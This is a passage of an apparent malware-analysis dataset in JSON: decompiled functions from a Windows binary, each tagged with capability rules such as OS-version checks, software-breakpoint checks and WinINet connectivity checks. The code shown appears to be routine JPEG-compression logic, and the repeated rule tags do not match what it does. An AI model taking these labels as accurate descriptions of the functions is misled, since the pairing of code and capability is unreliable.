in_EAX[0x33] = 1;\n        in_EAX[0xe] = 3;\n        puVar1 = in_EAX[0x10];\n        *puVar1 = 1;\n        puVar1[2] = 2;\n        puVar1[3] = 2;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = 0;\n        iVar3 = in_EAX[0x10];\n        *(iVar3 + 0x54) = 2;\n        *(iVar3 + 0x5c) = 1;\n        *(iVar3 + 0x60) = 1;\n        *(iVar3 + 100) = 1;\n        *(iVar3 + 0x68) = 1;\n        *(iVar3 + 0x6c) = 1;\n        iVar3 = in_EAX[0x10];\n        *(iVar3 + 0xa8) = 3;\n        *(iVar3 + 0xb0) = 1;\n        *(iVar3 + 0xb4) = 1;\n        *(iVar3 + 0xb8) = 1;\n        *(iVar3 + 0xbc) = 1;\n        *(iVar3 + 0xc0) = 1;\n        return;\n    case 4:\n        in_EAX[0x36] = 1;\n        in_EAX[0xe] = 4;\n        puVar1 = in_EAX[0x10];\n        *puVar1 = 0x43;\n        puVar1[2] = 1;\n        puVar1[3] = 1;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = 0;\n        iVar3 = in_EAX[0x10];\n        *(iVar3 + 0x54) = 0x4d;\n        *(iVar3 + 0x5c) = 1;\n        *(iVar3 + 0x60) = 1;\n        *(iVar3 + 100) = 0;\n        *(iVar3 + 0x68) = 0;\n        *(iVar3 + 0x6c) = 0;\n        iVar3 = in_EAX[0x10];\n        *(iVar3 + 0xa8) = 0x59;\n        *(iVar3 + 0xb0) = 1;\n        *(iVar3 + 0xb4) = 1;\n        *(iVar3 + 0xb8) = 0;\n        *(iVar3 + 0xbc) = 0;\n        *(iVar3 + 0xc0) = 0;\n        iVar3 = in_EAX[0x10];\n        *(iVar3 + 0xfc) = 0x4b;\n        *(iVar3 + 0x104) = 1;\n        *(iVar3 + 0x108) = 1;\n        *(iVar3 + 0x10c) = 0;\n        *(iVar3 + 0x110) = 0;\n        *(iVar3 + 0x114) = 0;\n        return;\n    case 5:\n        in_EAX[0x36] = 1;\n        in_EAX[0xe] = 4;\n        puVar1 = in_EAX[0x10];\n        *puVar1 = 1;\n        puVar1[2] = 2;\n        puVar1[3] = 2;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = 0;\n        iVar3 = in_EAX[0x10];\n        *(iVar3 + 0x54) = 2;\n        *(iVar3 + 0x5c) = 1;\n        *(iVar3 + 0x60) = 1;\n        *(iVar3 + 100) = 1;\n        *(iVar3 + 0x68) = 1;\n        *(iVar3 + 0x6c) = 1;\n        iVar3 = in_EAX[0x10];\n        *(iVar3 + 0xa8) = 3;\n        *(iVar3 + 0xb0) = 1;\n        *(iVar3 + 0xb4) = 1;\n        *(iVar3 + 0xb8) = 1;\n        *(iVar3 + 0xbc) = 1;\n        *(iVar3 + 0xc0) = 1;\n        iVar3 = in_EAX[0x10];\n        *(iVar3 + 0xfc) = 4;\n        *(iVar3 + 0x104) = 2;\n        *(iVar3 + 0x108) = 2;\n        *(iVar3 + 0x10c) = 0;\n        *(iVar3 + 0x110) = 0;\n        *(iVar3 + 0x114) = 0;\n        return;\n    default:\n        *(*in_EAX + 0x14) = 10;\n        (***in_EAX)();\n        return;\n    }\n}\n",
        "token_count": 1971
    },
    "004841d4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004841d4(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = in_EAX[0xe];\n    if (in_EAX[5] != 100) {\n        iVar3 = *in_EAX;\n        *(iVar3 + 0x14) = 0x14;\n        *(iVar3 + 0x18) = in_EAX[5];\n        (***in_EAX)(param_1);\n    }\n    if ((iVar1 == 3) && (in_EAX[0xf] == 3)) {\n        iVar3 = 10;\n    }\n    else if (iVar1 < 5) {\n        iVar3 = iVar1 * 4 + 2;\n    }\n    else {\n        iVar3 = iVar1 * 6;\n    }\n    if ((in_EAX[0x5b] == 0) || (in_EAX[0x5c] < iVar3)) {\n        iVar2 = iVar3;\n        if (iVar3 < 0xb) {\n            iVar2 = 10;\n        }\n        in_EAX[0x5c] = iVar2;\n        iVar2 = (**in_EAX[1])();\n        in_EAX[0x5b] = iVar2;\n    }\n    in_EAX[0x2a] = in_EAX[0x5b];\n    in_EAX[0x29] = iVar3;\n    if ((iVar1 == 3) && (in_EAX[0xf] == 3)) {\n        fcn.00484188(1);\n        fcn.00484124(2, 0, 5);\n        fcn.00484124(1, 0, 0x3f);\n        fcn.00484124(1, 0, 0x3f);\n        fcn.00484124(2, 0, 0x3f);\n        fcn.00484124(1, 2, 0x3f);\n        fcn.00484188(0);\n        fcn.00484124(0, 1, 0x3f);\n        fcn.00484124(0, 1, 0x3f);\n        fcn.00484124(0, 1, 0x3f);\n    }\n    else {\n        fcn.00484188(1);\n        fcn.0048414c(2, 0, 5);\n        fcn.0048414c(2, 0, 0x3f);\n        fcn.0048414c(1, 2, 0x3f);\n        fcn.00484188(0);\n        fcn.0048414c(0, 1, 0x3f);\n    }\n    return;\n}\n",
        "token_count": 635
    },
    "004843ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004843ec(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX[5] != 100) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    if (param_2 != 0) {\n        fcn.004846a4();\n    }\n    (**(*in_EAX + 0x10))();\n    (**(in_EAX[6] + 8))();\n    fcn.004848e0();\n    (**in_EAX[0x52])();\n    in_EAX[0x37] = 0;\n    if (in_EAX[0x2b] == 0) {\n        iVar1 = 0x65;\n    }\n    else {\n        iVar1 = 0x66;\n    }\n    in_EAX[5] = iVar1;\n    return;\n}\n",
        "token_count": 244
    },
    "00484460": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00484460(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if (in_EAX[5] != 0x65) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)(param_1);\n    }\n    if (in_EAX[8] <= in_EAX[0x37]) {\n        *(*in_EAX + 0x14) = 0x7b;\n        (**(*in_EAX + 4))();\n    }\n    iVar1 = in_EAX[2];\n    if (iVar1 != 0) {\n        *(iVar1 + 4) = in_EAX[0x37];\n        *(iVar1 + 8) = in_EAX[8];\n        (**in_EAX[2])();\n    }\n    if (*(in_EAX[0x52] + 0xc) != 0) {\n        (**(in_EAX[0x52] + 4))();\n    }\n    if (in_EAX[8] - in_EAX[0x37] < param_1) {\n        param_1 = in_EAX[8] - in_EAX[0x37];\n    }\n    (**(in_EAX[0x53] + 4))(param_1, 0);\n    in_EAX[0x37] = in_EAX[0x37] + param_1;\n    return CONCAT44(param_1, param_1);\n}\n",
        "token_count": 362
    },
    "004846ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004846ec(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if ((in_EAX[5] == 0x65) || (in_EAX[5] == 0x66)) {\n        if (in_EAX[0x37] < in_EAX[8]) {\n            *(*in_EAX + 0x14) = 0x43;\n            (***in_EAX)();\n        }\n        (**(in_EAX[0x52] + 8))();\n    }\n    else if (in_EAX[5] != 0x67) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    while (*(in_EAX[0x52] + 0x10) == 0) {\n        (**in_EAX[0x52])();\n        for (uVar2 = 0; uVar2 < in_EAX[0x3b]; uVar2 = uVar2 + 1) {\n            iVar1 = in_EAX[2];\n            if (iVar1 != 0) {\n                *(iVar1 + 4) = uVar2;\n                *(iVar1 + 8) = in_EAX[0x3b];\n                (**in_EAX[2])();\n            }\n            iVar1 = (**(in_EAX[0x55] + 4))();\n            if (iVar1 == 0) {\n                *(*in_EAX + 0x14) = 0x18;\n                (***in_EAX)();\n            }\n        }\n        (**(in_EAX[0x52] + 8))();\n    }\n    (**(in_EAX[0x56] + 0xc))();\n    (**(in_EAX[6] + 0x10))();\n    fcn.00483840();\n    return;\n}\n",
        "token_count": 447
    },
    "004847c8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004847c8(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t *in_EAX;\n    \n    if ((in_EAX[0x37] != 0) || (((iVar1 = in_EAX[5],  iVar1 != 0x65 && (iVar1 != 0x66)) && (iVar1 != 0x67)))) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    (**(in_EAX[0x56] + 0x14))();\n    pcVar2 = *(in_EAX[0x56] + 0x18);\n    while (arg_8h != 0) {\n        (*pcVar2)();\n        arg_8h = arg_8h + -1;\n    }\n    return;\n}\n",
        "token_count": 226
    },
    "004848e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004848e0(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.00485c1c();\n    if (in_EAX[0x2b] == 0) {\n        fcn.00486fbc();\n        fcn.004879a8();\n        fcn.004862d4();\n    }\n    fcn.00487fcc();\n    if (in_EAX[0x2c] == 0) {\n        if (in_EAX[0x38] == 0) {\n            fcn.00489d10();\n        }\n        else {\n            fcn.00488ad8();\n        }\n    }\n    else {\n        *(*in_EAX + 0x14) = 1;\n        (***in_EAX)();\n    }\n    fcn.00486ab8();\n    fcn.00485dbc();\n    fcn.00485160();\n    (**(in_EAX[1] + 0x18))();\n    (**in_EAX[0x56])();\n    return;\n}\n",
        "token_count": 229
    },
    "004851b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00485214)\n\nvoid fcn.004851b4(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if ((((in_EAX[8] == 0) || (in_EAX[7] == 0)) || (in_EAX[0xe] < 1)) || (in_EAX[9] < 1)) {\n        *(*in_EAX + 0x14) = 0x20;\n        (***in_EAX)();\n    }\n    if ((0xffdc < in_EAX[8]) || (0xffdc < in_EAX[7])) {\n        iVar3 = *in_EAX;\n        *(iVar3 + 0x14) = 0x29;\n        *(iVar3 + 0x18) = 0xffdc;\n        (***in_EAX)();\n    }\n    if (in_EAX[0xd] != 8) {\n        iVar3 = *in_EAX;\n        *(iVar3 + 0x14) = 0xf;\n        *(iVar3 + 0x18) = in_EAX[0xd];\n        (***in_EAX)();\n    }\n    if (10 < in_EAX[0xe]) {\n        iVar3 = *in_EAX;\n        *(iVar3 + 0x14) = 0x1a;\n        *(iVar3 + 0x18) = in_EAX[0xe];\n        *(iVar3 + 0x1c) = 10;\n        (***in_EAX)();\n    }\n    in_EAX[0x39] = 1;\n    in_EAX[0x3a] = 1;\n    iVar3 = in_EAX[0x10];\n    for (iVar4 = 0; iVar4 < in_EAX[0xe]; iVar4 = iVar4 + 1) {\n        if (((*(iVar3 + 8) < 1) || (4 < *(iVar3 + 8))) || ((*(iVar3 + 0xc) < 1 || (4 < *(iVar3 + 0xc))))) {\n            *(*in_EAX + 0x14) = 0x12;\n            (***in_EAX)();\n        }\n        if (*(iVar3 + 8) < in_EAX[0x39]) {\n            iVar1 = in_EAX[0x39];\n        }\n        else {\n            iVar1 = *(iVar3 + 8);\n        }\n        in_EAX[0x39] = iVar1;\n        if (*(iVar3 + 0xc) < in_EAX[0x3a]) {\n            iVar1 = in_EAX[0x3a];\n        }\n        else {\n            iVar1 = *(iVar3 + 0xc);\n        }\n        in_EAX[0x3a] = iVar1;\n        iVar3 = iVar3 + 0x54;\n    }\n    iVar3 = in_EAX[0x10];\n    for (iVar4 = 0; iVar4 < in_EAX[0xe]; iVar4 = iVar4 + 1) {\n        *(iVar3 + 4) = iVar4;\n        *(iVar3 + 0x24) = 8;\n        uVar2 = fcn.004837ac();\n        *(iVar3 + 0x1c) = uVar2;\n        uVar2 = fcn.004837ac();\n        *(iVar3 + 0x20) = uVar2;\n        uVar2 = fcn.004837ac();\n        *(iVar3 + 0x28) = uVar2;\n        uVar2 = fcn.004837ac();\n        *(iVar3 + 0x2c) = uVar2;\n        *(iVar3 + 0x30) = 1;\n        iVar3 = iVar3 + 0x54;\n    }\n    iVar3 = fcn.004837ac();\n    in_EAX[0x3b] = iVar3;\n    return;\n}\n",
        "token_count": 887
    },
    "00485378": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00485378(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_EAX;\n    int32_t *piVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t *piStack2648;\n    int32_t iStack2644;\n    int32_t iStack2636;\n    int32_t *piStack2620;\n    int32_t aiStack2616 [10];\n    int32_t aiStack2576 [640];\n    \n    if (in_EAX[0x29] < 1) {\n        *(*in_EAX + 0x14) = 0x13;\n        *(*in_EAX + 0x18) = 0;\n        (***in_EAX)();\n    }\n    piStack2648 = in_EAX[0x2a];\n    if ((piStack2648[5] == 0) && (piStack2648[6] == 0x3f)) {\n        in_EAX[0x38] = 0;\n        piVar6 = aiStack2616;\n        for (iStack2636 = 0; iStack2636 < in_EAX[0xe]; iStack2636 = iStack2636 + 1) {\n            *piVar6 = 0;\n            piVar6 = piVar6 + 1;\n        }\n    }\n    else {\n        in_EAX[0x38] = 1;\n        piVar6 = aiStack2576;\n        for (iStack2636 = 0; iStack2636 < in_EAX[0xe]; iStack2636 = iStack2636 + 1) {\n            iVar7 = 0;\n            do {\n                *piVar6 = -1;\n                piVar6 = piVar6 + 1;\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x40);\n        }\n    }\n    for (iStack2644 = 1; iStack2644 <= in_EAX[0x29]; iStack2644 = iStack2644 + 1) {\n        iVar7 = *piStack2648;\n        if ((iVar7 < 1) || (4 < iVar7)) {\n            iVar1 = *in_EAX;\n            *(iVar1 + 0x14) = 0x1a;\n            *(iVar1 + 0x18) = iVar7;\n            *(iVar1 + 0x1c) = 4;\n            (***in_EAX)();\n        }\n        iStack2636 = 0;\n        piVar6 = piStack2648;\n        if (0 < iVar7) {\n            do {\n                iVar1 = piVar6[1];\n                if ((iVar1 < 0) || (in_EAX[0xe] <= iVar1)) {\n                    iVar2 = *in_EAX;\n                    *(iVar2 + 0x14) = 0x13;\n                    *(iVar2 + 0x18) = iStack2644;\n                    (***in_EAX)();\n                }\n                if ((0 < iStack2636) && (iVar1 <= *piVar6)) {\n                    iVar1 = *in_EAX;\n                    *(iVar1 + 0x14) = 0x13;\n                    *(iVar1 + 0x18) = iStack2644;\n                    (***in_EAX)();\n                }\n                iStack2636 = iStack2636 + 1;\n                piVar6 = piVar6 + 1;\n            } while (iStack2636 < iVar7);\n        }\n        iVar1 = piStack2648[5];\n        iVar2 = piStack2648[6];\n        iVar3 = piStack2648[7];\n        iVar4 = piStack2648[8];\n        if (in_EAX[0x38] == 0) {\n            if ((((iVar1 != 0) || (iVar2 != 0x3f)) || (iVar3 != 0)) || (iVar4 != 0)) {\n                iVar1 = *in_EAX;\n                *(iVar1 + 0x14) = 0x11;\n                *(iVar1 + 0x18) = iStack2644;\n                (***in_EAX)();\n            }\n            iStack2636 = 0;\n            piVar6 = piStack2648;\n            if (0 < iVar7) {\n                do {\n                    piVar6 = piVar6 + 1;\n                    iVar1 = *piVar6;\n                    if (aiStack2616[iVar1] != 0) {\n                        iVar2 = *in_EAX;\n                        *(iVar2 + 0x14) = 0x13;\n                        *(iVar2 + 0x18) = iStack2644;\n                        (***in_EAX)();\n                    }\n                    aiStack2616[iVar1] = 1;\n                    iStack2636 = iStack2636 + 1;\n                } while (iStack2636 < iVar7);\n            }\n        }\n        else {\n            if (((((iVar1 < 0) || (0x3f < iVar1)) || ((iVar2 < iVar1 || ((0x3f < iVar2 || (iVar3 < 0)))))) ||\n                (10 < iVar3)) || ((iVar4 < 0 || (10 < iVar4)))) {\n                iVar8 = *in_EAX;\n                *(iVar8 + 0x14) = 0x11;\n                *(iVar8 + 0x18) = iStack2644;\n                (***in_EAX)();\n            }\n            if (iVar1 == 0) {\n                if (iVar2 != 0) {\n                    iVar8 = *in_EAX;\n                    *(iVar8 + 0x14) = 0x11;\n                    *(iVar8 + 0x18) = iStack2644;\n                    (***in_EAX)();\n                }\n            }\n            else if (iVar7 != 1) {\n                iVar8 = *in_EAX;\n                *(iVar8 + 0x14) = 0x11;\n                *(iVar8 + 0x18) = iStack2644;\n                (***in_EAX)();\n            }\n            iStack2636 = 0;\n            piStack2620 = piStack2648;\n            if (0 < iVar7) {\n                do {\n                    piStack2620 = piStack2620 + 1;\n                    iVar8 = *piStack2620;\n                    if ((iVar1 != 0) && (aiStack2576[iVar8 * 0x40] < 0)) {\n                        iVar5 = *in_EAX;\n                        *(iVar5 + 0x14) = 0x11;\n                        *(iVar5 + 0x18) = iStack2644;\n                        (***in_EAX)();\n                    }\n                    piVar6 = aiStack2576 + iVar8 * 0x40 + iVar1;\n                    for (iVar8 = iVar1; iVar8 <= iVar2; iVar8 = iVar8 + 1) {\n                        if (*piVar6 < 0) {\n                            if (iVar3 != 0) {\n                                iVar5 = *in_EAX;\n                                *(iVar5 + 0x14) = 0x11;\n                                *(iVar5 + 0x18) = iStack2644;\n                                (***in_EAX)();\n                            }\n                        }\n                        else if ((iVar3 != *piVar6) || (iVar3 + -1 != iVar4)) {\n                            iVar5 = *in_EAX;\n                            *(iVar5 + 0x14) = 0x11;\n                            *(iVar5 + 0x18) = iStack2644;\n                            (***in_EAX)();\n                        }\n                        *piVar6 = iVar4;\n                        piVar6 = piVar6 + 1;\n                    }\n                    iStack2636 = iStack2636 + 1;\n                } while (iStack2636 < iVar7);\n            }\n        }\n        piStack2648 = piStack2648 + 9;\n    }\n    if (in_EAX[0x38] == 0) {\n        piVar6 = aiStack2616;\n        for (iStack2636 = 0; iStack2636 < in_EAX[0xe]; iStack2636 = iStack2636 + 1) {\n            if (*piVar6 == 0) {\n                *(*in_EAX + 0x14) = 0x2d;\n                (***in_EAX)();\n            }\n            piVar6 = piVar6 + 1;\n        }\n    }\n    else {\n        piVar6 = aiStack2576;\n        for (iStack2636 = 0; iStack2636 < in_EAX[0xe]; iStack2636 = iStack2636 + 1) {\n            if (*piVar6 < 0) {\n                *(*in_EAX + 0x14) = 0x2d;\n                (***in_EAX)();\n            }\n            piVar6 = piVar6 + 0x40;\n        }\n    }\n    return;\n}\n",
        "token_count": 1984
    },
    "00485c1c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00485c1c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x148) = puVar1;\n    *puVar1 = 0x4859fc;\n    puVar1[1] = 0x485b98;\n    puVar1[2] = 0x485bc0;\n    puVar1[4] = 0;\n    fcn.004851b4();\n    if (*(in_EAX + 0xa8) == 0) {\n        *(in_EAX + 0xe0) = 0;\n        *(in_EAX + 0xa4) = 1;\n    }\n    else {\n        fcn.00485378();\n    }\n    if (*(in_EAX + 0xe0) != 0) {\n        *(in_EAX + 0xb4) = 1;\n    }\n    if (param_2 == 0) {\n        puVar1[5] = 0;\n    }\n    else if (*(in_EAX + 0xb4) == 0) {\n        puVar1[5] = 2;\n    }\n    else {\n        puVar1[5] = 1;\n    }\n    puVar1[8] = 0;\n    puVar1[6] = 0;\n    if (*(in_EAX + 0xb4) == 0) {\n        puVar1[7] = *(in_EAX + 0xa4);\n    }\n    else {\n        puVar1[7] = *(in_EAX + 0xa4) * 2;\n    }\n    return;\n}\n",
        "token_count": 392
    },
    "00485d24": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00485d24(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x14c);\n    while( true ) {\n        if (*(in_EAX + 0xec) <= *(iVar1 + 8)) {\n            return;\n        }\n        if (*(iVar1 + 0xc) < 8) {\n            (**(*(in_EAX + 0x150) + 4))(8, iVar1 + 0xc, iVar1 + 0x18, arg_8h);\n        }\n        if (*(iVar1 + 0xc) != 8) break;\n        iVar2 = (**(*(in_EAX + 0x154) + 4))();\n        if (iVar2 == 0) {\n            if (*(iVar1 + 0x10) != 0) {\n                return;\n            }\n            *in_ECX = *in_ECX + -1;\n            *(iVar1 + 0x10) = 1;\n            return;\n        }\n        if (*(iVar1 + 0x10) != 0) {\n            *in_ECX = *in_ECX + 1;\n            *(iVar1 + 0x10) = 0;\n        }\n        *(iVar1 + 0xc) = 0;\n        *(iVar1 + 8) = *(iVar1 + 8) + 1;\n    }\n    return;\n}\n",
        "token_count": 350
    },
    "00485dbc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00485dbc(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    puVar1 = (**in_EAX[1])(param_1);\n    in_EAX[0x53] = puVar1;\n    *puVar1 = 0x485ce4;\n    if (in_EAX[0x2b] == 0) {\n        if (param_2 == 0) {\n            puVar1 = puVar1 + 6;\n            iVar3 = in_EAX[0x10];\n            for (iVar4 = 0; iVar4 < in_EAX[0xe]; iVar4 = iVar4 + 1) {\n                uVar2 = (**(in_EAX[1] + 8))(*(iVar3 + 0xc) << 3);\n                *puVar1 = uVar2;\n                puVar1 = puVar1 + 1;\n                iVar3 = iVar3 + 0x54;\n            }\n        }\n        else {\n            *(*in_EAX + 0x14) = 4;\n            (***in_EAX)();\n        }\n    }\n    return;\n}\n",
        "token_count": 284
    },
    "00485eb4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00485eb4(uint32_t arg_8h, uint32_t *arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    int32_t in_EAX;\n    uint32_t *in_ECX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_EAX + 0x150);\n    while( true ) {\n        if (arg_14h <= *in_ECX) {\n            return;\n        }\n        if (arg_8h <= *arg_ch) break;\n        uVar1 = *(in_EAX + 0xe8) - *(iVar3 + 0x34);\n        uVar2 = arg_14h - *in_ECX;\n        if (uVar1 < uVar2) {\n            uVar2 = uVar1;\n        }\n        (**(*(in_EAX + 0x15c) + 4))(uVar2, *(iVar3 + 0x34));\n        *in_ECX = *in_ECX + uVar2;\n        *(iVar3 + 0x34) = *(iVar3 + 0x34) + uVar2;\n        *(iVar3 + 0x30) = *(iVar3 + 0x30) - uVar2;\n        if ((*(iVar3 + 0x30) == 0) && (*(iVar3 + 0x34) < *(in_EAX + 0xe8))) {\n            for (iVar4 = 0; iVar4 < *(in_EAX + 0x38); iVar4 = iVar4 + 1) {\n                fcn.00485e7c(*(in_EAX + 0xe8));\n            }\n            *(iVar3 + 0x34) = *(in_EAX + 0xe8);\n        }\n        if (*(iVar3 + 0x34) == *(in_EAX + 0xe8)) {\n            (**(*(in_EAX + 0x160) + 4))(*arg_ch, arg_10h);\n            *(iVar3 + 0x34) = 0;\n            *arg_ch = *arg_ch + 1;\n        }\n        if ((*(iVar3 + 0x30) == 0) && (*arg_ch < arg_8h)) {\n            iVar3 = *(in_EAX + 0x40);\n            for (iVar4 = 0; iVar4 < *(in_EAX + 0x38); iVar4 = iVar4 + 1) {\n                fcn.00485e7c(*(iVar3 + 0xc) * arg_8h);\n                iVar3 = iVar3 + 0x54;\n            }\n            *arg_ch = arg_8h;\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 654
    },
    "00486014": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00486014(uint32_t arg_8h, uint32_t *arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint32_t *in_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x150);\n    iVar2 = *(in_EAX + 0xe8) * 3;\n    do {\n        if (arg_8h <= *arg_ch) {\n            return;\n        }\n        if (*in_ECX < arg_14h) {\n            uVar3 = *(iVar1 + 0x3c) - *(iVar1 + 0x34);\n            uVar4 = arg_14h - *in_ECX;\n            if (uVar3 < uVar4) {\n                uVar4 = uVar3;\n            }\n            (**(*(in_EAX + 0x15c) + 4))(uVar4, *(iVar1 + 0x34));\n            if (*(in_EAX + 0x20) == *(iVar1 + 0x30)) {\n                for (var_14h = 0; var_14h < *(in_EAX + 0x38); var_14h = var_14h + 1) {\n                    for (iVar5 = 1; iVar5 <= *(in_EAX + 0xe8); iVar5 = iVar5 + 1) {\n                        fcn.004837d4(*(in_EAX + 0x1c), 1, -iVar5);\n                    }\n                }\n            }\n            *in_ECX = *in_ECX + uVar4;\n            *(iVar1 + 0x34) = *(iVar1 + 0x34) + uVar4;\n            *(iVar1 + 0x30) = *(iVar1 + 0x30) - uVar4;\n        }\n        else {\n            if (*(iVar1 + 0x30) != 0) {\n                return;\n            }\n            if (*(iVar1 + 0x34) < *(iVar1 + 0x3c)) {\n                for (var_14h = 0; var_14h < *(in_EAX + 0x38); var_14h = var_14h + 1) {\n                    fcn.00485e7c(*(iVar1 + 0x3c));\n                }\n                *(iVar1 + 0x34) = *(iVar1 + 0x3c);\n            }\n        }\n        if (*(iVar1 + 0x34) == *(iVar1 + 0x3c)) {\n            (**(*(in_EAX + 0x160) + 4))(*arg_ch, arg_10h);\n            *arg_ch = *arg_ch + 1;\n            *(iVar1 + 0x38) = *(iVar1 + 0x38) + *(in_EAX + 0xe8);\n            if (iVar2 <= *(iVar1 + 0x38)) {\n                *(iVar1 + 0x38) = 0;\n            }\n            if (iVar2 <= *(iVar1 + 